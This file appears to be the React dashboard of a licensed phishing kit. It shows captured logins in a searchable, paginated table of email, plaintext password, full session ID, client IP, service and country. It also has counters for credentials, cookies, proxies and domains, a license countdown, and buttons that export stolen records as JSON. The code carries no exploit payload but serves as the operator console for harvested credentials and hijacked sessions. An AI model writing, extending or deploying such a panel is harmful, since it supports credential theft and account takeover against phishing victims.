"use client";

import { useEffect, useMemo, useState } from "react";
import {
  Activity,
  ChevronLeft,
  ChevronRight,
  Clock3,
  Download,
  Eye,
  FileDown,
  KeyRound,
  Search,
  Trash2,
  Users,
} from "lucide-react";

export type LogRow = {
  id: string;
  email: string;
  password: string;
  fullSessionId: string;
  clientIp: string;
  service: string;
  country: string;
  firstSeen: string;
  lastSeen: string;
  fullTimestamp: string;
};

export type DashboardStats = {
  clients: number;
  credentials: number;
  cookies: number;
  proxies: number;
  domains: number;
  securityEvents: number;
};

const pageSizeOptions = [5, 10, 20];

function downloadJson(filename: string, payload: unknown) {
  const blob = new Blob([JSON.stringify(payload, null, 2)], {
    type: "application/json",
  });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  link.click();
  URL.revokeObjectURL(url);
}

export function OverviewClient({
  initialRows,
  stats,
  licenseId,
  expiresAt,
}: {
  initialRows: LogRow[];
  stats: DashboardStats;
  licenseId: string;
  expiresAt: string;
}) {
  const [rows, setRows] = useState(initialRows);
  const [query, setQuery] = useState("");
  const [selected, setSelected] = useState<LogRow | null>(null);
  const [deleteTarget, setDeleteTarget] = useState<LogRow | null>(null);
  const [page, setPage] = useState(1);
  const [pageSize, setPageSize] = useState(10);
  const timeLeft = useCountdown(expiresAt);

  const filteredRows = useMemo(() => {
    const normalized = query.trim().toLowerCase();
    if (!normalized) return rows;
    return rows.filter((row) =>
      Object.values(row).some((value) => value.toLowerCase().includes(normalized)),
    );
  }, [query, rows]);

  const totalPages = Math.max(1, Math.ceil(filteredRows.length / pageSize));
  const currentPage = Math.min(page, totalPages);
  const paginatedRows = filteredRows.slice((currentPage - 1) * pageSize, currentPage * pageSize);

  useEffect(() => {
    setPage(1);
  }, [query, pageSize]);

  function confirmDelete() {
    if (!deleteTarget) return;
    setRows((current) => current.filter((item) => item.id !== deleteTarget.id));
    setDeleteTarget(null);
  }

  return (
    <div className="min-h-screen px-4 py-6 sm:px-6 lg:px-8">
      <div className="mx-auto max-w-7xl space-y-6">
        <div className="flex flex-col gap-4 lg:flex-row lg:items-end lg:justify-between">
          <div>
            <p className="text-sm font-medium text-cyan-300">Dashboard</p>
            <h1 className="mt-2 text-3xl font-semibold tracking-tight text-[var(--text)]">Overview</h1>
            <p className="mt-2 max-w-2xl text-sm leading-6 text-[var(--muted)]">
              Monitor license status, captured records, routing configuration, and security activity in one place.
            </p>
          </div>
          <button
            type="button"
            onClick={() => downloadJson("ce-admin-log-data.json", rows)}
            className="flex items-center justify-center gap-2 rounded-lg bg-cyan-400 px-4 py-2.5 text-sm font-semibold text-slate-950 transition hover:bg-cyan-300"
          >
            <FileDown className="h-4 w-4" />
            Export All
          </button>
        </div>

        <div className="grid gap-4 lg:grid-cols-[1.2fr_0.8fr]">
          <div className="rounded-lg border border-[var(--border)] bg-[linear-gradient(135deg,var(--panel),var(--soft))] p-5">
            <p className="text-sm text-[var(--muted)]">License key</p>
            <p className="mt-3 break-all font-mono text-lg font-semibold text-[var(--text)]">{licenseId}</p>
            <div className="mt-5 grid gap-3 sm:grid-cols-4">
              {[
                ["Days", timeLeft.days],
                ["Hours", timeLeft.hours],
                ["Minutes", timeLeft.minutes],
                ["Seconds", timeLeft.seconds],
              ].map(([label, value]) => (
                <div key={label} className="rounded-lg border border-[var(--border)] bg-[var(--surface)] p-3 text-center">
                  <p className="text-2xl font-semibold text-[var(--text)]">{value}</p>
                  <p className="text-xs text-[var(--muted)]">{label}</p>
                </div>
              ))}
            </div>
          </div>

          <div className="rounded-lg border border-[var(--border)] bg-[var(--panel)] p-5">
            <label htmlFor="search" className="text-sm font-medium text-[var(--text)]">
              Search logs
            </label>
            <div className="mt-3 flex items-center rounded-lg border border-[var(--border)] bg-[var(--surface)] px-3">
              <Search className="h-4 w-4 text-[var(--muted)]" />
              <input
                id="search"
                value={query}
                onChange={(event) => setQuery(event.target.value)}
                placeholder="Filter by email, IP, country, session, or service"
                className="min-w-0 flex-1 bg-transparent px-3 py-3 text-sm text-[var(--text)] outline-none placeholder:text-slate-500"
              />
            </div>
            <p className="mt-4 text-sm text-[var(--muted)]">
              {filteredRows.length} visible from {rows.length} log rows
            </p>
          </div>
        </div>

        <div className="grid gap-4 sm:grid-cols-2 xl:grid-cols-6">
          <StatCard label="Logs" value={rows.length} icon={Users} />
          <StatCard label="Credentials" value={stats.credentials} icon={KeyRound} />
          {/* <StatCard label="Cookies" value={stats.cookies} icon={Download} /> */}
          <StatCard label="Proxies" value={stats.proxies} icon={Activity} />
          <StatCard label="Domains" value={stats.domains} icon={Clock3} />
          {/* <StatCard label="Security" value={stats.securityEvents} icon={Activity} /> */}
        </div>

        <section className="overflow-hidden rounded-lg border border-[var(--border)] bg-[var(--panel)] shadow-xl shadow-black/5">
          <div className="flex flex-col gap-3 border-b border-[var(--border)] bg-[var(--surface)] px-4 py-4 sm:flex-row sm:items-center sm:justify-between">
            <div>
              <h2 className="font-semibold text-[var(--text)]">Log data</h2>
              <p className="mt-1 text-xs text-[var(--muted)]">
                Page {currentPage} of {totalPages}
              </p>
            </div>
            <label className="flex items-center gap-2 text-sm text-[var(--muted)]">
              Rows
              <select
                value={pageSize}
                onChange={(event) => setPageSize(Number(event.target.value))}
                className="rounded-lg border border-[var(--border)] bg-[var(--panel)] px-2 py-2 text-[var(--text)] outline-none"
              >
                {pageSizeOptions.map((size) => (
                  <option key={size} value={size}>
                    {size}
                  </option>
                ))}
              </select>
            </label>
          </div>

          <div className="overflow-x-auto">
            <table className="min-w-[920px] w-full text-left text-sm">
              <thead className="border-b border-[var(--border)] text-xs uppercase text-[var(--muted)]">
                <tr>
                  {["ID", "Email/Username", "Password", "Client IP", "Service", "Country", "Actions"].map((heading) => (
                    <th key={heading} className="px-4 py-3 font-semibold">
                      {heading}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody className="divide-y divide-[var(--border)]">
                {paginatedRows.map((row) => (
                  <tr key={row.id} className="transition hover:bg-[var(--surface)]">
                    <td className="px-4 py-4 font-mono text-xs text-[var(--muted)]">{row.id}</td>
                    <td className="px-4 py-4">
                      <p className="font-medium text-[var(--text)]">{row.email}</p>
                      <p className="mt-1 max-w-[220px] truncate font-mono text-xs text-[var(--muted)]">
                        {row.fullSessionId}
                      </p>
                    </td>
                    <td className="px-4 py-4">
                      <span className="rounded-md border border-[var(--border)] bg-[var(--surface)] px-2 py-1 font-mono text-xs text-[var(--text)]">
                        {row.password}
                      </span>
                    </td>
                    <td className="px-4 py-4 text-[var(--text)]">{row.clientIp}</td>
                    <td className="px-4 py-4">
                      <span className="rounded-md bg-cyan-400/10 px-2 py-1 text-xs font-medium text-cyan-400">
                        {row.service}
                      </span>
                    </td>
                    <td className="px-4 py-4 text-[var(--text)]">{row.country}</td>
                    <td className="px-4 py-4">
                      <div className="flex items-center gap-2">
                        <IconButton label={`View ${row.id}`} title="View details" onClick={() => setSelected(row)}>
                          <Eye className="h-4 w-4" />
                        </IconButton>
                        <IconButton label={`Download ${row.id}`} title="Download JSON" onClick={() => downloadJson(`${row.email}.json`, row)}>
                          <Download className="h-4 w-4" />
                        </IconButton>
                        <button
                          type="button"
                          onClick={() => setDeleteTarget(row)}
                          className="flex h-9 w-9 items-center justify-center rounded-lg border border-rose-400/20 text-rose-300 transition hover:bg-rose-400/10"
                          aria-label={`Delete ${row.id}`}
                          title="Delete row"
                        >
                          <Trash2 className="h-4 w-4" />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
                {paginatedRows.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="px-4 py-12 text-center text-sm text-[var(--muted)]">
                      No log data matches the current filter.
                    </td>
                  </tr>
                ) : null}
              </tbody>
            </table>
          </div>

          <div className="flex flex-col gap-3 border-t border-[var(--border)] px-4 py-4 sm:flex-row sm:items-center sm:justify-between">
            <p className="text-sm text-[var(--muted)]">
              Showing {paginatedRows.length === 0 ? 0 : (currentPage - 1) * pageSize + 1}-
              {Math.min(currentPage * pageSize, filteredRows.length)} of {filteredRows.length}
            </p>
            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={() => setPage((current) => Math.max(1, current - 1))}
                disabled={currentPage === 1}
                className="flex items-center gap-2 rounded-lg border border-[var(--border)] px-3 py-2 text-sm text-[var(--text)] disabled:opacity-40"
              >
                <ChevronLeft className="h-4 w-4" />
                Previous
              </button>
              <button
                type="button"
                onClick={() => setPage((current) => Math.min(totalPages, current + 1))}
                disabled={currentPage === totalPages}
                className="flex items-center gap-2 rounded-lg border border-[var(--border)] px-3 py-2 text-sm text-[var(--text)] disabled:opacity-40"
              >
                Next
                <ChevronRight className="h-4 w-4" />
              </button>
            </div>
          </div>
        </section>
      </div>

      {selected ? <DetailsDialog row={selected} onClose={() => setSelected(null)} /> : null}
      {deleteTarget ? (
        <ConfirmDeleteDialog
          row={deleteTarget}
          onCancel={() => setDeleteTarget(null)}
          onConfirm={confirmDelete}
        />
      ) : null}
    </div>
  );
}

function IconButton({
  label,
  title,
  onClick,
  children,
}: {
  label: string;
  title: string;
  onClick: () => void;
  children: React.ReactNode;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      className="flex h-9 w-9 items-center justify-center rounded-lg border border-[var(--border)] text-[var(--muted)] transition hover:bg-[var(--surface)] hover:text-[var(--text)]"
      aria-label={label}
      title={title}
    >
      {children}
    </button>
  );
}

function DetailsDialog({ row, onClose }: { row: LogRow; onClose: () => void }) {
  return (
    <div className="fixed inset-0 z-[80] flex items-center justify-center bg-black/60 px-4">
      <div className="max-h-[82vh] w-full max-w-2xl overflow-y-auto rounded-lg border border-[var(--border)] bg-[var(--panel)] p-5 shadow-2xl">
        <div className="flex items-center justify-between gap-4">
          <h2 className="text-lg font-semibold text-[var(--text)]">Log details</h2>
          <button type="button" onClick={onClose} className="rounded-lg border border-[var(--border)] px-3 py-1.5 text-sm text-[var(--text)]">
            Close
          </button>
        </div>
        <dl className="mt-5 grid gap-3 sm:grid-cols-2">
          {Object.entries(row).map(([key, value]) => (
            <div key={key} className="rounded-lg bg-[var(--surface)] p-3">
              <dt className="text-xs uppercase text-[var(--muted)]">{key}</dt>
              <dd className="mt-1 break-all text-sm text-[var(--text)]">{value}</dd>
            </div>
          ))}
        </dl>
      </div>
    </div>
  );
}

function ConfirmDeleteDialog({
  row,
  onCancel,
  onConfirm,
}: {
  row: LogRow;
  onCancel: () => void;
  onConfirm: () => void;
}) {
  return (
    <div className="fixed inset-0 z-[90] flex items-center justify-center bg-black/70 px-4 backdrop-blur-sm">
      <div className="w-full max-w-sm rounded-lg border border-[var(--border)] bg-[var(--panel)] p-6 shadow-2xl">
        <div className="flex h-12 w-12 items-center justify-center rounded-lg bg-rose-500/15 text-rose-400">
          <Trash2 className="h-6 w-6" />
        </div>
        <h2 className="mt-5 text-xl font-semibold text-[var(--text)]">Delete this row?</h2>
        <p className="mt-2 text-sm leading-6 text-[var(--muted)]">
          This removes <span className="font-medium text-[var(--text)]">{row.email}</span> from the current table view.
        </p>
        <div className="mt-6 grid grid-cols-2 gap-3">
          <button type="button" onClick={onCancel} className="rounded-lg border border-[var(--border)] px-4 py-2.5 text-sm font-medium text-[var(--text)]">
            Cancel
          </button>
          <button type="button" onClick={onConfirm} className="rounded-lg bg-rose-500 px-4 py-2.5 text-sm font-semibold text-white">
            Delete
          </button>
        </div>
      </div>
    </div>
  );
}

// function useCountdown(expiresAt: string) {
//   const [now, setNow] = useState(() => Date.now());

//   useEffect(() => {
//     const timer = window.setInterval(() => setNow(Date.now()), 1000);
//     return () => window.clearInterval(timer);
//   }, []);

//   const remaining = Math.max(0, new Date(expiresAt).getTime() - now);
//   return {
//     days: Math.floor(remaining / 86_400_000),
//     hours: Math.floor((remaining % 86_400_000) / 3_600_000),
//     minutes: Math.floor((remaining % 3_600_000) / 60_000),
//     seconds: Math.floor((remaining % 60_000) / 1000),
//   };
// }
function useCountdown(expiresAt: string) {
  const [mounted, setMounted] = useState(false);
  const [now, setNow] = useState(0);

  useEffect(() => {
    setMounted(true);
    setNow(Date.now());

    const timer = setInterval(() => {
      setNow(Date.now());
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  if (!mounted) {
    return {
      days: 0,
      hours: 0,
      minutes: 0,
      seconds: 0,
    };
  }

  const remaining = Math.max(
    0,
    new Date(expiresAt).getTime() - now
  );

  return {
    days: Math.floor(remaining / 86_400_000),
    hours: Math.floor((remaining % 86_400_000) / 3_600_000),
    minutes: Math.floor((remaining % 3_600_000) / 60_000),
    seconds: Math.floor((remaining % 60_000) / 1000),
  };
}

function StatCard({
  label,
  value,
  icon: Icon,
}: {
  label: string;
  value: number;
  icon: React.ComponentType<{ className?: string }>;
}) {
  return (
    <div className="rounded-lg border border-[var(--border)] bg-[var(--panel)] p-4">
      <div className="flex items-center justify-between">
        <p className="text-sm text-[var(--muted)]">{label}</p>
        <Icon className="h-4 w-4 text-cyan-400" />
      </div>
      <p className="mt-3 text-2xl font-semibold text-[var(--text)]">{value}</p>
    </div>
  );
}
